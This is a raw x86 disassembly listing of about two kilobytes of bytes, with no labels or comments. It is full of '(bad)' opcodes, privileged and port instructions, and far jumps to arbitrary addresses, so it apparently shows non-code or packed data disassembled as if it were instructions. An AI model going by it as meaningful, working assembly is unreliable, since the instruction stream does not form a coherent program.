  4122a5:	loope  0x4122d0
  4122a7:	mov    edx,0x51389260
  4122ac:	sahf   
  4122ad:	push   cs
  4122ae:	mov    ss,ecx
  4122b0:	cmp    DWORD PTR [esi],eax
  4122b2:	hlt    
  4122b3:	dec    edx
  4122b4:	mov    WORD PTR [ecx+0x55],gs
  4122b7:	cmp    edx,0x1fa89188
  4122bd:	push   ebx
  4122be:	cdq    
  4122bf:	sahf   
  4122c0:	cdq    
  4122c1:	inc    edi
  4122c2:	outs   dx,BYTE PTR ds:[esi]
  4122c3:	mov    BYTE PTR [esi],bl
  4122c5:	sbb    al,0xc2
  4122c7:	stc    
  4122c8:	or     DWORD PTR [ebx],edi
  4122ca:	sbb    dl,ch
  4122cc:	in     eax,dx
  4122cd:	mov    al,ds:0x36c1ac0a
  4122d2:	rcl    BYTE PTR [edi+0x11e7b68b],0x19
  4122d9:	jmp    0x6e9d:0xf16406bf
  4122e0:	call   0x1634:0xd902a5cd
  4122e7:	lods   eax,DWORD PTR ds:[esi]
  4122e8:	xor    eax,0xc97bee53
  4122ed:	sar    BYTE PTR [ecx],1
  4122ef:	outs   dx,BYTE PTR ds:[esi]
  4122f0:	adc    cl,al
  4122f2:	popf   
  4122f3:	dec    ebp
  4122f4:	ret    0x34dd
  4122f7:	les    esp,FWORD PTR [esi]
  4122f9:	aas    
  4122fa:	cdq    
  4122fb:	mov    cl,0x72
  4122fd:	jg     0x4122b6
  4122ff:	and    ebp,DWORD PTR [esi-0xa743961]
  412305:	sbb    BYTE PTR [ebp+0x6f],bl
  412308:	xchg   bh,al
  41230a:	jmp    0x45033494
  41230f:	test   eax,0x82081246
  412314:	adc    al,0xe
  412316:	dec    ecx
  412317:	cmp    ecx,esi
  412319:	jnp    0x4122a5
  41231b:	jg     0x4122ca
  41231d:	jmp    DWORD PTR [ebp-0x3b98791a]
  412323:	sti    
  412324:	sub    BYTE PTR [edi+0x22b883ba],bh
  41232a:	loopne 0x412376
  41232c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41232d:	cdq    
  41232e:	retf   0x9317
  412331:	ficomp DWORD PTR [ecx-0x5cd13759]
  412337:	pop    ebp
  412338:	add    bh,dl
  41233a:	mov    DWORD PTR [edx+0x2e],edx
  41233d:	gs (bad) 
  412340:	icebp  
  412341:	clc    
  412342:	mov    ah,0x96
  412344:	lds    ebp,FWORD PTR [esi]
  412346:	icebp  
  412347:	push   ds
  412348:	les    ebx,FWORD PTR [eax+0x5aeb4050]
  41234e:	or     DWORD PTR [edi+0x79528fb2],edi
  412354:	mov    edx,edx
  412356:	retf   0xf720
  412359:	sub    ebp,DWORD PTR [edi+0x76]
  41235c:	fidivr DWORD PTR [ecx]
  41235e:	jge    0x412367
  412360:	iret   
  412361:	mov    esp,0x47b7d82d
  412366:	xchg   BYTE PTR [ebp-0xb],al
  412369:	mov    ds:0x595ad6c,al
  41236e:	and    al,0x82
  412370:	fndisi(8087 only) 
  412372:	push   es
  412373:	jb     0x41234d
  412375:	cmp    eax,0x729f101a
  41237a:	mov    ebp,0xa7b29c1c
  41237f:	test   eax,0xcb89a96b
  412384:	adc    ebx,DWORD PTR [ecx]
  412386:	out    dx,al
  412387:	popa   
  412388:	sub    BYTE PTR [ebx],ah
  41238a:	pop    edi
  41238b:	arpl   WORD PTR [edx+0x73],di
  41238e:	(bad)  
  41238f:	idiv   BYTE PTR [ecx+edx*8]
  412392:	or     esi,DWORD PTR [ecx-0x2fcb7c25]
  412398:	icebp  
  412399:	or     edx,DWORD PTR ds:0xc946d7be
  41239f:	pop    es
  4123a0:	hlt    
  4123a1:	gs int3 
  4123a3:	mov    dl,BYTE PTR [ecx]
  4123a5:	pop    edx
  4123a6:	into   
  4123a7:	and    DWORD PTR [ecx],0x27a376c9
  4123ad:	test   al,0x2a
  4123af:	js     0x41241c
  4123b1:	pop    esp
  4123b2:	outs   dx,DWORD PTR ds:[esi]
  4123b3:	jne    0x412387
  4123b5:	add    ebx,edi
  4123b7:	test   dh,dl
  4123b9:	fadd   QWORD PTR fs:[edx]
  4123bc:	ins    BYTE PTR es:[edi],dx
  4123bd:	idiv   ah
  4123bf:	(bad)  
  4123c1:	das    
  4123c2:	sub    al,0x57
  4123c4:	and    al,0x8c
  4123c6:	test   eax,0x6a873b8c
  4123cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123cd:	pop    ecx
  4123ce:	int3   
  4123cf:	mov    bh,0xf5
  4123d1:	adc    bh,bl
  4123d3:	push   esp
  4123d4:	std    
  4123d5:	mov    ebx,0xc797dc8
  4123da:	pop    ecx
  4123db:	xchg   esp,eax
  4123dc:	retf   
  4123dd:	shl    BYTE PTR [esi-0x6c],0x82
  4123e1:	push   esi
  4123e2:	push   0xffffff8d
  4123e4:	pop    eax
  4123e5:	push   es
  4123e6:	pop    esi
  4123e7:	aas    
  4123e8:	pop    es
  4123e9:	inc    ebx
  4123ea:	out    0xd6,eax
  4123ec:	pop    ss
  4123ed:	jp     0x412405
  4123ef:	rol    BYTE PTR [ebx+0x6db24dcb],1
  4123f5:	cmp    eax,0xc7e609bb
  4123fa:	mov    eax,ds:0x49c3e4b9
  4123ff:	inc    eax
  412400:	shr    DWORD PTR [eax+0x777265bd],1
  412406:	jb     0x412485
  412408:	push   esp
  412409:	pop    ds
  41240a:	cmp    BYTE PTR [esi],ch
  41240c:	out    0x60,al
  41240e:	pop    eax
  41240f:	test   BYTE PTR [eax-0x4a759986],cl
  412415:	fisub  WORD PTR [esi+ebx*2+0x6a825d61]
  41241c:	lea    eax,[ecx]
  41241e:	out    dx,eax
  41241f:	add    BYTE PTR [ebx],ch
  412421:	adc    ebp,DWORD PTR [edx+0x6073e827]
  412427:	sbb    BYTE PTR [edx+esi*4+0x54],al
  41242b:	sub    al,BYTE PTR ss:[edx+0xa]
  41242f:	lahf   
  412430:	fmul   DWORD PTR [ebx]
  412432:	dec    esi
  412433:	ss imul ecx,ecx,0x2d
  412437:	jnp    0x41241a
  412439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41243a:	pop    esi
  41243b:	dec    ebx
  41243c:	leave  
  41243d:	scas   al,BYTE PTR es:[edi]
  41243e:	mov    ah,cl
  412440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412441:	addr16 dec esp
  412443:	ins    BYTE PTR es:[edi],dx
  412444:	sbb    edi,edi
  412446:	dec    eax
  412447:	in     al,0x70
  412449:	mov    bh,0x9a
  41244b:	mov    ebp,DWORD PTR [ebx+0xc]
  41244e:	dec    esi
  41244f:	jmp    0x4124a6
  412451:	ins    BYTE PTR es:[edi],dx
  412452:	int    0x60
  412454:	mov    bl,0xe6
  412456:	adc    ch,BYTE PTR [ecx+0x782cb76]
  41245c:	jp     0x412485
  41245e:	inc    ebp
  41245f:	repz int 0xf5
  412462:	out    dx,al
  412463:	loopne 0x4123e6
  412465:	fwait
  412466:	div    DWORD PTR [ecx-0x12]
  412469:	lock icebp 
  41246b:	mov    ds:0xcc17fc00,eax
  412470:	adc    dh,cl
  412472:	inc    ebx
  412473:	pop    eax
  412474:	arpl   WORD PTR [ecx+0x62be7c2b],dx
  41247a:	dec    ebp
  41247b:	std    
  41247c:	int    0xf9
  41247e:	or     DWORD PTR [ebp-0x7f],ebx
  412481:	scas   eax,DWORD PTR es:[edi]
  412482:	sahf   
  412483:	rol    bl,1
  412485:	je     0x41241a
  412487:	jmp    0x4531a589
  41248c:	dec    eax
  41248d:	cmp    esi,edi
  41248f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412490:	outs   dx,BYTE PTR ds:[esi]
  412491:	pop    edi
  412492:	clc    
  412493:	mov    dh,0x4e
  412495:	(bad)  
  412496:	cmp    BYTE PTR [ecx+0x0],bl
  412499:	sahf   
  41249a:	ror    ecx,cl
  41249c:	nop
  41249d:	jno    0x412509
  41249f:	mov    eax,ds:0xcc0e6618
  4124a4:	xchg   esp,eax
  4124a5:	(bad)  [ecx+edx*8-0x547172c9]
  4124ac:	ins    DWORD PTR es:[edi],dx
  4124ad:	push   ds
  4124ae:	inc    eax
  4124af:	loope  0x41247d
  4124b1:	in     eax,0xff
  4124b3:	jmp    0xf8ac5a35
  4124b8:	push   ecx
  4124b9:	mov    cl,0xdb
  4124bb:	push   eax
  4124bc:	popf   
  4124bd:	xor    al,0x6b
  4124bf:	push   ds
  4124c0:	ins    BYTE PTR es:[edi],dx
  4124c1:	sub    dl,0x52
  4124c4:	sahf   
  4124c5:	test   edi,ebp
  4124c7:	xchg   ebp,eax
  4124c8:	xchg   BYTE PTR [edi+0x6a702288],ch
  4124ce:	pusha  
  4124cf:	sub    al,0xd5
  4124d1:	cld    
  4124d2:	cs adc al,0x6e
  4124d5:	cmc    
  4124d6:	add    al,0x57
  4124d8:	mov    eax,ds:0xe93dc3b0
  4124dd:	repnz adc BYTE PTR [ebp+edi*4-0xc],0xea
  4124e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124e4:	addr16 pop edi
  4124e6:	js     0x41254c
  4124e8:	cmp    dl,cl
  4124ea:	fsubr  st(7),st
  4124ec:	outs   dx,DWORD PTR ds:[esi]
  4124ed:	cld    
  4124ee:	out    dx,al
  4124ef:	mov    esi,DWORD PTR [edi-0x48]
  4124f2:	fidivr WORD PTR [esp+eiz*4+0x10]
  4124f6:	sahf   
  4124f7:	add    al,0xe1
  4124f9:	in     al,0x34
  4124fb:	xchg   ebp,eax
  4124fc:	mov    edi,0x1ccc85ef
  412501:	in     eax,dx
  412502:	dec    edi
  412503:	mov    dl,0xa3
  412505:	(bad)  
  412506:	nop
  412507:	push   edi
  412508:	xchg   edi,eax
  412509:	sbb    edi,DWORD PTR [edi]
  41250b:	or     dh,BYTE PTR [eax-0x27]
  41250e:	mov    ebx,DWORD PTR [edi+0x75c43b6]
  412514:	out    0x1c,al
  412516:	ss jl  0x412569
  412519:	lock aad 0x97
  41251c:	mov    dh,0x5a
  41251e:	or     ah,BYTE PTR [ecx+0x72]
  412521:	push   ebx
  412522:	ins    DWORD PTR es:[edi],dx
  412523:	icebp  
  412524:	sbb    bl,bh
  412526:	pop    ss
  412527:	iret   
  412528:	sbb    eax,0xa8d5ecba
  41252d:	mov    dh,0x25
  41252f:	pop    ebp
  412530:	call   0x11626e3f
  412535:	fiadd  DWORD PTR [edi]
  412537:	fistp  DWORD PTR [eax+0x1c6fcc5a]
  41253d:	hlt    
  41253e:	xor    BYTE PTR [ebp-0x4a80f50b],0x71
  412545:	int    0x22
  412547:	ror    DWORD PTR [eax],cl
  412549:	ins    BYTE PTR es:[edi],dx
  41254a:	iret   
  41254b:	cwde   
  41254c:	mov    ch,0x4f
  41254e:	fs clc 
  412550:	or     DWORD PTR [ecx-0x1e],ebp
  412553:	in     al,0x59
  412555:	cmp    DWORD PTR [edx+0x3f0dc7f0],edi
  41255b:	dec    esi
  41255c:	xchg   ebp,eax
  41255d:	dec    esp
  41255e:	xor    DWORD PTR [esi+ebp*1+0x2e],edx
  412562:	daa    
  412563:	fs scas eax,DWORD PTR es:[edi]
  412565:	mov    edx,0x6330961a
  41256a:	out    0x75,eax
  41256c:	dec    ebp
  41256d:	pop    edi
  41256e:	out    dx,eax
  41256f:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  412571:	xchg   ebp,eax
  412572:	repz call 0x828a:0x4012a95d
  41257a:	pop    esi
  41257b:	push   0x48
  41257d:	mov    ch,0x9f
  41257f:	int    0xc3
  412581:	push   cs
  412582:	dec    esp
  412583:	pop    ebp
  412584:	call   0x6ae8:0x77615c3
  41258b:	mov    ch,0xb9
  41258d:	std    
  41258e:	scas   eax,DWORD PTR es:[edi]
  41258f:	es call 0xb05fa8cb
  412595:	outs   dx,DWORD PTR ds:[esi]
  412596:	pusha  
  412597:	(bad)  
  412598:	lods   al,BYTE PTR ds:[esi]
  412599:	jl     0x4125d3
  41259b:	add    eax,0xae76ec95
  4125a0:	mov    bh,BYTE PTR [edi+0x5f]
  4125a3:	jg     0x412592
  4125a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125a6:	or     al,BYTE PTR [ebp-0x1b]
  4125a9:	adc    al,0x7
  4125ab:	mov    esi,0x89d17c30
  4125b0:	test   eax,0x90577a4c
  4125b5:	scas   eax,DWORD PTR es:[edi]
  4125b6:	dec    esp
  4125b7:	sub    eax,0xf6ab808
  4125bc:	retf   0xa169
  4125bf:	sbb    al,dh
  4125c1:	iret   
  4125c2:	aam    0xa4
  4125c4:	xor    al,0xf7
  4125c6:	sub    eax,0xa8a668ef
  4125cb:	lea    eax,[ecx+ebx*8]
  4125ce:	dec    ecx
  4125cf:	pop    ebp
  4125d0:	xor    dl,BYTE PTR [edx]
  4125d2:	fcom   DWORD PTR [edi+0x38bdc27b]
  4125d8:	xor    eax,0xe536cce
  4125dd:	push   0xa8905301
  4125e2:	in     eax,0xff
  4125e4:	adc    eax,0x609c37b8
  4125e9:	xchg   edi,esi
  4125eb:	or     bl,cl
  4125ed:	out    0xe5,al
  4125ef:	imul   eax,DWORD PTR [ebp-0x33],0xffffffad
  4125f3:	pop    ss
  4125f4:	dec    esp
  4125f5:	mov    bl,0x41
  4125f7:	shr    esi,0xdb
  4125fa:	jno    0x4125c4
  4125fc:	stos   DWORD PTR es:[edi],eax
  4125fd:	push   0xf
  4125ff:	test   DWORD PTR [edi-0x36188628],edi
  412605:	stc    
  412606:	inc    edx
  412607:	push   eax
  412608:	dec    eax
  412609:	inc    esi
  41260a:	rcl    BYTE PTR [eax+ebx*4-0x5beab03e],0xa6
  412612:	lock sbb eax,0x4391ef8c
  412618:	add    eax,0xa700b514
  41261d:	xor    BYTE PTR [ebx-0x52ca1d17],cl
  412623:	hlt    
  412624:	lods   eax,DWORD PTR ds:[esi]
  412625:	cli    
  412626:	retf   0x8c45
  412629:	add    eax,0xf48e3049
  41262e:	add    edx,DWORD PTR [ecx+0x46]
  412631:	inc    esp
  412632:	enter  0xd639,0x42
  412636:	mov    edi,0x549fe8dc
  41263b:	faddp  st(2),st
  41263d:	pop    ds
  41263e:	cmc    
  41263f:	mov    eax,ds:0x678a4efe
  412644:	iret   
  412645:	sbb    al,0x89
  412647:	out    dx,eax
  412648:	loope  0x41265d
  41264a:	dec    edx
  41264b:	sbb    edx,DWORD PTR [edx-0x383e59f8]
  412651:	mov    edi,DWORD PTR [ebp+0x42697525]
  412657:	nop
  412658:	jae    0x4126c7
  41265a:	jae    0x4126c9
  41265c:	or     ch,dh
  41265e:	pop    esi
  41265f:	sub    BYTE PTR [ebx],dl
  412661:	mov    esi,0x284dfbb9
  412666:	inc    esp
  412667:	gs jg  0x41260a
  41266a:	and    ebx,ebp
  41266c:	mov    ds:0xc9a9c24b,al
  412671:	and    DWORD PTR [edx-0x1],edx
  412674:	jmp    0x4125fe
  412676:	dec    esi
  412677:	cwd    
  412679:	hlt    
  41267a:	mov    bh,0xf9
  41267c:	push   ss
  41267d:	nop
  41267e:	cli    
  41267f:	aaa    
  412680:	pop    edx
  412681:	nop
  412682:	mov    edi,DWORD PTR [esi]
  412684:	cwde   
  412685:	jo     0x412633
  412687:	mov    dh,BYTE PTR [edi+0x52]
  41268a:	ins    BYTE PTR es:[edi],dx
  41268b:	(bad)  
  41268d:	(bad)  
  41268e:	xor    al,0xb6
  412690:	dec    esp
  412691:	(bad)  
  412692:	mov    ch,0x78
  412694:	mov    dl,0xa4
  412696:	fist   DWORD PTR [edx]
  412698:	add    eax,0xe111c2d1
  41269d:	cmp    eax,0x7a0f164f
  4126a2:	dec    ebx
  4126a3:	mov    ebx,0x4071d600
  4126a8:	dec    ecx
  4126a9:	pop    esp
  4126aa:	sub    DWORD PTR [esi+ebp*8-0x3f],eax
  4126ae:	or     bh,0x34
  4126b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126b2:	aas    
  4126b3:	retf   
  4126b4:	fcomp  QWORD PTR [ecx]
  4126b6:	push   cs
  4126b7:	shl    dh,cl
  4126b9:	cld    
  4126ba:	xor    bh,BYTE PTR [edx+0x7d100bb4]
  4126c0:	mov    DWORD PTR [edx+0x45],ecx
  4126c3:	int    0xa8
  4126c5:	loop   0x41266b
  4126c7:	or     esp,DWORD PTR [eax+0x6a]
  4126ca:	loop   0x4126fa
  4126cc:	fidiv  DWORD PTR [ebp-0x48]
  4126cf:	jge    0x412712
  4126d1:	into   
  4126d2:	call   0xc2a6b336
  4126d7:	push   edi
  4126d8:	sbb    BYTE PTR [ecx+0x6c1b8568],dl
  4126de:	(bad)  
  4126df:	jg     0x412736
  4126e1:	dec    ecx
  4126e2:	sub    BYTE PTR [eax+0x69],cl
  4126e5:	pop    esp
  4126e6:	loopne 0x412748
  4126e8:	pop    ss
  4126e9:	repz aas 
  4126eb:	fist   WORD PTR [eax]
  4126ed:	adc    BYTE PTR [edx+edx*8-0xb],bh
  4126f1:	scas   eax,DWORD PTR es:[edi]
  4126f2:	mov    BYTE PTR ds:0xeb702b34,al
  4126f8:	mov    bl,0x7
  4126fa:	lds    edx,FWORD PTR [ecx+0x3f0aa420]
  412700:	jns    0x412705
  412702:	sub    al,0x3e
  412704:	xor    ecx,DWORD PTR [edx-0x7f]
  412707:	shl    DWORD PTR [ecx],cl
  412709:	mov    dl,0xa8
  41270b:	or     bl,0x53
  41270e:	dec    edx
  41270f:	xchg   ecx,eax
  412710:	test   ecx,ecx
  412712:	sub    ecx,ebp
  412714:	push   esi
  412715:	pop    esp
  412716:	popa   
  412717:	mov    ebp,DWORD PTR [ebp+0x4]
  41271a:	jbe    0x4126ee
  41271c:	push   cs
  41271d:	rcr    DWORD PTR [ecx+ecx*4+0x31193aeb],0x8d
  412725:	push   cs
  412726:	mov    BYTE PTR [ecx-0x48],bh
  412729:	ret    
  41272a:	or     al,0x6f
  41272c:	shl    DWORD PTR [ecx-0x60d720b8],1
  412732:	add    cl,dl
  412734:	nop
  412735:	addr16 cmp cl,dh
  412738:	cmp    BYTE PTR [eax+0x6bb58e4],bl
  41273e:	les    edx,FWORD PTR [eax-0xd]
  412741:	shr    DWORD PTR [ecx-0x7c],0x28
  412745:	cld    
  412746:	data16 (bad) 
  412749:	push   ebx
  41274a:	cmp    edx,DWORD PTR [edi-0x57c62d14]
  412750:	retf   0x29c
  412753:	fs (bad) 
  412755:	sti    
  412756:	pop    es
  412757:	loope  0x4127c8
  412759:	mov    eax,ds:0xf4613c93
  41275e:	push   0xffffffe8
  412760:	std    
  412761:	dec    eax
  412762:	sbb    DWORD PTR [ebx],esi
  412764:	jns    0x4126f6
  412766:	pop    es
  412767:	add    ebp,DWORD PTR [ecx-0x4f]
  41276a:	int    0x35
  41276c:	sbb    ch,ch
  41276e:	inc    ebp
  41276f:	sbb    BYTE PTR [edx],0x14
  412772:	and    bh,bl
  412774:	js     0x4127e6
  412776:	inc    esp
  412777:	call   0x3c15:0xd530322a
  41277e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41277f:	sbb    BYTE PTR [edx],ah
  412781:	add    ebp,0x56caf4ec
  412787:	sub    DWORD PTR [edi+ebp*4+0x23],edi
  41278b:	sub    al,0xf4
  41278d:	or     cl,al
  41278f:	xchg   ebp,eax
  412790:	je     0x4127a5
  412792:	ds pop esp
  412794:	cmp    DWORD PTR [edi-0x32],ebp
  412797:	or     BYTE PTR [ebx],dl
  412799:	bound  esi,QWORD PTR [ebx]
  41279b:	sti    
  41279c:	and    ch,BYTE PTR [ebp+edx*4+0x38796e54]
  4127a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127a4:	push   es
  4127a5:	adc    edx,DWORD PTR [ebx]
  4127a7:	out    0xc5,al
  4127a9:	push   ecx
  4127aa:	lea    ebx,[eax-0x2bf5ed6b]
  4127b0:	inc    edx
  4127b1:	mov    ch,0x6a
  4127b3:	dec    ebx
  4127b4:	inc    edx
  4127b5:	push   ecx
  4127b6:	jle    0x41275c
  4127b8:	push   ds
  4127b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127ba:	lock outs dx,DWORD PTR ds:[esi]
  4127bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127bd:	pop    es
  4127be:	mov    ds:0x76e8a70,al
  4127c3:	inc    ebx
  4127c4:	(bad)  
  4127c6:	cmp    edi,DWORD PTR [edx+eax*2-0x6a]
  4127ca:	adc    al,0x17
  4127cc:	xor    edx,DWORD PTR [ecx]
  4127ce:	adc    BYTE PTR [edi-0x45],al
  4127d1:	pop    ebx
  4127d2:	xor    dx,di
  4127d5:	mov    al,ds:0x77f061dc
  4127da:	sbb    al,0x7b
  4127dc:	and    al,dl
  4127de:	inc    edi
  4127df:	mov    WORD PTR [edx],gs
  4127e1:	stc    
  4127e2:	shl    DWORD PTR [ecx-0x37],cl
  4127e5:	sbb    al,0xca
  4127e7:	xor    dl,BYTE PTR [ecx+eiz*1-0x35c33ed0]
  4127ee:	jbe    0x412817
  4127f0:	loope  0x4127ca
  4127f2:	and    edx,DWORD PTR [ebx+edi*4]
  4127f5:	adc    al,0xa5
  4127f7:	fstp   DWORD PTR [edx-0x308807e8]
  4127fe:	cld    
  4127ff:	pop    ss
  412800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412801:	adc    ecx,DWORD PTR [ebx]
  412803:	push   ebp
  412804:	icebp  
  412805:	aaa    
  412806:	ds pop esp
  412808:	mov    al,0xdf
  41280a:	into   
  41280b:	(bad)  
  41280c:	aam    0xce
  41280e:	stc    
  41280f:	ins    DWORD PTR es:[edi],dx
  412810:	aad    0x9e
  412812:	jecxz  0x41286b
  412814:	(bad)  
  412815:	in     eax,dx
  412816:	fwait
  412817:	dec    esp
  412818:	fs ja  0x4127aa
  41281b:	inc    ebx
  41281c:	dec    esi
  41281d:	xchg   esi,eax
  41281e:	out    0xcc,al
  412820:	sbb    al,0x97
  412822:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412823:	inc    ecx
  412824:	and    edx,edi
  412826:	mov    eax,ds:0xa69da3a5
  41282b:	fisttp DWORD PTR [esi-0x42e9e3c0]
  412831:	or     eax,0xea5ea013
  412836:	and    WORD PTR [ecx+esi*8+0x57],sp
  41283b:	out    dx,eax
  41283c:	cmp    ch,ch
  41283e:	test   al,ah
  412840:	cmc    
  412841:	pop    es
  412842:	pushf  
  412843:	xor    eax,0x21d42bd2
  412848:	adc    BYTE PTR [ebp+edx*8-0x5d],dl
  41284c:	dec    BYTE PTR [edx]
  41284e:	add    eax,DWORD PTR [edx+0x1f6cbed8]
  412854:	xchg   BYTE PTR [edi-0x63],bh
  412857:	and    al,0x39
  412859:	pop    ebp
  41285a:	inc    esi
  41285b:	daa    
  41285c:	mov    dh,0xd7
  41285e:	outs   dx,DWORD PTR ds:[esi]
  41285f:	sub    al,0x8f
  412861:	outs   dx,BYTE PTR ds:[esi]
  412862:	xor    ecx,0x73db4fd9
  412868:	imul   esi,DWORD PTR [ebx+0x1240a495],0xf0476e0a
  412872:	(bad)  
  412873:	sbb    edi,DWORD PTR [ebx]
  412875:	mov    bh,BYTE PTR [ecx]
  412877:	xchg   edx,eax
  412878:	or     ah,BYTE PTR [ebp-0x33]
  41287b:	and    edx,DWORD PTR [eax]
  41287d:	jl     0x412835
  41287f:	jle    0x4128f4
  412881:	or     ebp,DWORD PTR [ebx]
  412883:	pop    esp
  412884:	ret    0x71c5
  412887:	shr    ch,1
  412889:	hlt    
  41288a:	inc    esi
  41288b:	jecxz  0x41286c
  41288d:	jle    0x412854
  41288f:	out    dx,eax
  412890:	jge    0x4128ee
  412892:	rcr    BYTE PTR [ebp+0x58313f20],0x82
  412899:	mov    ch,0xce
  41289b:	push   es
  41289c:	sar    BYTE PTR ds:0x8574175b,cl
  4128a2:	call   0x4bf2:0x55107797
  4128a9:	js     0x412888
  4128ab:	xchg   ebx,eax
  4128ac:	mul    BYTE PTR [esi]
  4128ae:	stos   BYTE PTR es:[edi],al
  4128af:	jne    0x4128a0
  4128b1:	mov    ecx,0x7ee4369
  4128b6:	sbb    BYTE PTR [ebp+0x8],ch
  4128b9:	in     al,0x93
  4128bb:	adc    BYTE PTR [ebx+0x488b48d6],cl
  4128c1:	loopne 0x412886
  4128c3:	stos   DWORD PTR es:[edi],eax
  4128c4:	icebp  
  4128c5:	mov    ch,0xe4
  4128c7:	jecxz  0x412877
  4128c9:	add    ecx,DWORD PTR [ecx]
  4128cb:	push   edi
  4128cc:	mov    ebx,0xd38c85c6
  4128d1:	push   ss
  4128d2:	mov    esp,0xd10d6ac8
  4128d7:	sbb    edi,DWORD PTR [eax+0x2384c868]
  4128dd:	(bad)  
  4128de:	ins    BYTE PTR es:[edi],dx
  4128df:	jno    0x412881
  4128e1:	jle    0x4128c6
  4128e3:	xchg   BYTE PTR [edi],bl
  4128e5:	xchg   eax,ebp
  4128e7:	fstp   DWORD PTR [ecx]
  4128e9:	stc    
  4128ea:	mov    bh,0xf9
  4128ec:	out    dx,eax
  4128ed:	cmp    al,0xa6
  4128ef:	les    esp,FWORD PTR ds:0x72ae3300
  4128f5:	mov    DWORD PTR [ebx],eax
  4128f7:	aaa    
  4128f8:	mov    eax,ds:0x44dc7431
  4128fd:	sbb    al,0x9e
  4128ff:	cmp    DWORD PTR [ebx],ebp
  412901:	cmp    BYTE PTR [edi+ebx*4+0x2],cl
  412905:	mov    esp,0xde08bdd5
  41290a:	xchg   ecx,eax
  41290b:	aad    0x49
  41290d:	into   
  41290e:	push   ebx
  41290f:	out    dx,eax
  412910:	pop    ecx
  412911:	into   
  412912:	dec    eax
  412913:	push   esp
  412914:	jae    0x4128f2
  412916:	out    0x24,al
  412918:	cdq    
  412919:	ror    DWORD PTR [esi],cl
  41291b:	sahf   
  41291c:	out    dx,eax
  41291d:	adc    BYTE PTR [edi],0xfb
  412920:	jns    0x4128b1
  412922:	mov    eax,ds:0x382433db
  412927:	test   BYTE PTR [ebp+0x8857c46],bh
  41292d:	sbb    bh,BYTE PTR [edx+0x45]
  412930:	imul   DWORD PTR [edi+eiz*2]
  412933:	popa   
  412934:	xor    BYTE PTR [eax],ch
  412936:	dec    eax
  412937:	adc    DWORD PTR [esi],0xffffffdc
  41293a:	mov    ebp,0xfcb392ae
  41293f:	in     eax,dx
  412940:	rcl    DWORD PTR [edi],0x4a
  412943:	cdq    
  412944:	std    
  412945:	mov    edi,0x76f3f041
  41294a:	mov    eax,ebx
  41294c:	stc    
  41294d:	dec    eax
  41294e:	mov    eax,ds:0x10e03667
  412953:	(bad)  
  412955:	ret    
  412956:	dec    esi
  412957:	add    eax,DWORD PTR [esi]
  412959:	fs iret 
  41295b:	hlt    
  41295c:	and    eax,0x4fe60706
  412961:	test   al,0xa4
  412963:	sti    
  412964:	scas   eax,DWORD PTR es:[edi]
  412965:	push   esp
  412966:	dec    ebp
  412967:	jecxz  0x412928
  412969:	test   BYTE PTR [ebp+0x7d],bl
  41296c:	mov    edx,0xed44b5ce
  412971:	mov    ebx,0xbdcf98a
  412976:	mov    esi,0x5be5ff7c
  41297b:	adc    BYTE PTR [ebp+0xe11b3af],dl
  412981:	mov    al,0x1
  412983:	ja     0x412958
  412985:	cmp    al,0xcc
  412987:	stos   BYTE PTR es:[edi],al
  412988:	xor    eax,0x4c5f60ac
  41298d:	xchg   DWORD PTR [edi-0x4e],eax
  412990:	xor    edi,DWORD PTR [esi+eiz*4-0x11]
  412994:	bound  esi,QWORD PTR [edi-0x43f602d7]
  41299a:	push   esi
  41299b:	cli    
  41299c:	xchg   BYTE PTR ds:0xe7e24700,bl
  4129a2:	aad    0xe8
  4129a4:	cmp    al,0xa4
  4129a6:	jmp    0x83ba:0xcac31caf
  4129ad:	jp     0x412a06
  4129af:	sub    DWORD PTR [esi+0x450c1c19],eax
  4129b5:	push   ss
  4129b6:	icebp  
  4129b7:	mov    esi,0x139a3341
  4129bc:	lds    ecx,FWORD PTR [edx+0x38697ec9]
  4129c2:	pop    ds
  4129c3:	scas   al,BYTE PTR es:[edi]
  4129c4:	adc    edx,edi
  4129c6:	aad    0x74
  4129c8:	add    bl,BYTE PTR [eax+ebx*8-0x9]
  4129cc:	pop    ebp
  4129cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129ce:	dec    ecx
  4129cf:	xor    DWORD PTR [edx-0x43],edx
  4129d2:	sub    BYTE PTR [ecx+0x3f],bl
  4129d5:	stc    
  4129d6:	repz popw ds
  4129d9:	repz cmp BYTE PTR [ebx+ebp*1-0x2eacb32],dh
  4129e1:	push   edi
  4129e2:	sar    BYTE PTR [edi],cl
  4129e4:	out    0x9d,eax
  4129e6:	mov    BYTE PTR [edi+0x65],bh
  4129e9:	push   ebp
  4129ea:	popf   
  4129eb:	std    
  4129ec:	call   0xc94ac192
  4129f1:	inc    bx
  4129f3:	sub    al,0x68
  4129f5:	cwde   
  4129f6:	sub    dl,BYTE PTR [ebx+0x51]
  4129f9:	sub    eax,DWORD PTR [esi+0x2e]
  4129fc:	jns    0x4129ae
  4129fe:	icebp  
  4129ff:	int3   
  412a00:	js     0x412a18
  412a02:	pop    esi
  412a03:	lahf   
  412a04:	call   0x80c1a13
  412a09:	cmp    DWORD PTR [ecx-0x48],esi
  412a0c:	xor    BYTE PTR [esp+eiz*4-0x39d8b329],al
  412a13:	ins    BYTE PTR es:[edi],dx
  412a14:	sbb    eax,0x87f00307
  412a19:	inc    edi
  412a1a:	mov    ebp,0xcc1e3366
  412a1f:	sub    al,0x8e
  412a21:	sar    eax,0xc9
  412a24:	and    BYTE PTR [ebp+0x6c8022b],ch
  412a2a:	xchg   BYTE PTR [edx-0x1b],ch
